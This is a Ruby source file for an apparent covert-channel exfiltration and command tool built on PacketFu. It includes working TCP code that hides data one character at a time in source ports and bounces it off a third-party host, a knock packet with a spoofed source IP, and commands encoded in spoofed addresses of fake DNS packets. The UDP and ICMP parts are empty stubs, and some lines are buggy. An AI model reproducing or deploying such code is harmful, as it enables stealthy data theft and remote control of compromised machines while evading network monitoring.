#Library Files
require 'rubygems'
require 'packetfu'
#User Defined Files
require File.expand_path(File.join(File.dirname(__FILE__), 'cipher.rb'))

#payload of packets will consist of 16 bytes for the IV and rest of bytes in payload.
#where appropriate payload will be hidden in the header (iv in combination with
#passwords stored in programs will be used to authenticate all transmission packets

#tcp will embed 2 bytes into source port
#4 bytes into sequence and 4 bytes into acknowledge headers
#then furthor data in the payload
#tcp will use a third party server to bounce traffic off of

#udp will pack 2 bytes into the source port and use destport in the filter
#rest of data will be in payload as per above

#icmp will load 2 bytes into each id and sequence number fields then rest of data
#into payload


include PacketFu
$config = PacketFu::Utils.whoami?(:iface => $iface)

class Connector
  #attr_accessor :iface, :connection, :addr, :pass, :server, :port
  def initialize(iface, connection, addr, pass, server, port = nil)
    @iface = iface
    @connection = connection
    @addr = addr
    @cipher = Encrypter.new(pass)
    @server = server
    @port = port
    @id = 32452
    if server == "server"
       if @connection == "tcp"
         $destMac = PacketFu::Utils.arp($tcpBounceIp, :iface => @iface)
       else
         $destMac = PacketFu::Utils.arp(@addr, :iface => @iface)
       end
    end
  end

  def exfilSend(payload)
    case @connection
      when "tcp"
        tcpSend(payload)
      when "udp"
        udpSend(payload)
      when "icmp"
        icmpSend(payload)
      else
  #      abort "Connector::send Invalid connection type"
    end

  end

  def exfilRecv(pkt)
    case @connection
      when "tcp"
        payload = tcpRecv(pkt)
      when "udp"
        payload = udpRecv(pkt)
      when "icmp"
        payload = icmpRecv(pkt)
      else
        abort "Connector::recv Invalid connection type"
    end

    #iv = payload[0,16]

    #data = payload[16..-1]

    #result = @cipher.decrypt(iv, data)
    #return result
    return payload
  end

  def sendAddr()
    puts "Sending Knock 2"
    tcp_pkt = TCPPacket.new(:config => $config)
    tcp_pkt.eth_daddr = $destMac
    tcp_pkt.tcp_flags = TcpFlags.new(:ack => 1, :psh => 1)
    tcp_pkt.tcp_dst = @port
    tcp_pkt.tcp_src = rand(57000) + 8000
    tcp_pkt.ip_saddr = "153.251.232.153"
    tcp_pkt.ip_daddr = $ipDest

    iv = @cipher.newIv
    iv += @cipher.encrypt(iv, $ipSource)
    tcp_pkt.payload = iv
    tcp_pkt.recalc
    tcp_pkt.to_w(@iface)
  end

  def cliSend(payload)
    puts "sending command to client: #{payload}"
    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 53, :udp_dst => $cliPass)
    i = 0
    while  payload.length > 0
      if i % 4 == 0
        a = payload[i]
      end
      if i % 4 == 1
        b = payload[i]
      end
      if i % 4 == 2
        c = payload[i]
      end
      if i % 4 == 3
        d = payload[i]
        s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
        cliPacketize(s_addr)
      end
      if payload[i] == 10
        puts "here"
        finalize = i%4
        case finalize
          when 0
            b = c = d = 10
            s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
            cliPacketize(s_addr)
            return
          when 1
            c = d = 10
            s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
            cliPacketize(s_addr)
            return
          when 2
            d = 10
            s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
            cliPacketize(s_addr)
            return
          when 3
            s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
            cliPacketize(s_addr)
            return
        end
      end
      i += 1
    end
  end

  def servRecv(pkt)
    a = pkt.ip_saddr.split(".")
    return a[0].to_i.chr + a[1].to_i.chr + a[2].to_i.chr + a[3].to_i.chr
  end

  private
  def cliPacketize(saddr)
    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 53, :udp_dst => @port)
    udp_pkt.eth_daddr = $destMac
    udp_pkt.ip_daddr = $ipDest
    puts saddr
    udp_pkt.ip_saddr = saddr
    udp_pkt.payload =  "\x4d"+"\xe2"+"\x81"+"\x82"+"\x00"+"\x01"+"\x00"+"\x00"
    udp_pkt.payload += "\x00"+"\x00"+"\x00"+"\x00"+"\x08"+"\x44"+"\x61"+"\x74"
    udp_pkt.payload += "\x61"+"\x43"+"\x6f"+"\x6d"+"\x6d"+"\x00"+"\x00"+"\x01"
    udp_pkt.payload += "\x00"+"\x02"
    udp_pkt.recalc
    udp_pkt.to_w(@iface)
  end

  def tcpSend(payload)
	payload.each_char do |char|
	  
      tcp_pkt = TCPPacket.new(:config => $config)
      tcp_pkt.eth_daddr = $destMac
      tcp_pkt.tcp_flags = TcpFlags.new(:ack => 1)
      tcp_pkt.tcp_dst = @port
	  tcp_pkt.tcp_src = char[0] << 8
      tcp_pkt.ip_saddr = @addr
      tcp_pkt.ip_daddr = $tcpBounceIp
      tcp_pkt.recalc
      tcp_pkt.to_w(@iface)
	  print char
	  sleep(1)

	end
	tcp_pkt = TCPPacket.new(:config => $config)
	tcp_pkt.eth_daddr = $destMac
	tcp_pkt.tcp_flags = TcpFlags.new(:ack => 1)
	tcp_pkt.tcp_dst = @port
	tcp_pkt.tcp_src = 57359
	tcp_pkt.ip_saddr = @addr
	tcp_pkt_ip_daddr = $tcpBounceIp
	tcp_pkt.recalc
	tcp_pkt.to_w(@iface)
	puts "finished tx"
  end

  def udpSend(payload)
    #udp_pkt = UDPPacket.new(:config => $config, :udp_src => 21423, :udp_dst => 53)
  end

  def icmpSend(payload)
  end
  def tcpRecv(pkt)
  end
  def udpRecv
  end
  def icmpRecv
  end
end

def testSend
#attr_accessor :iface, :connection, :addr, :cipher, :server, :port
  a = Connector.new("wlan0", "tcp", "192.168.0.97", "moo", "client", 53)
  a.send("doggy")
end


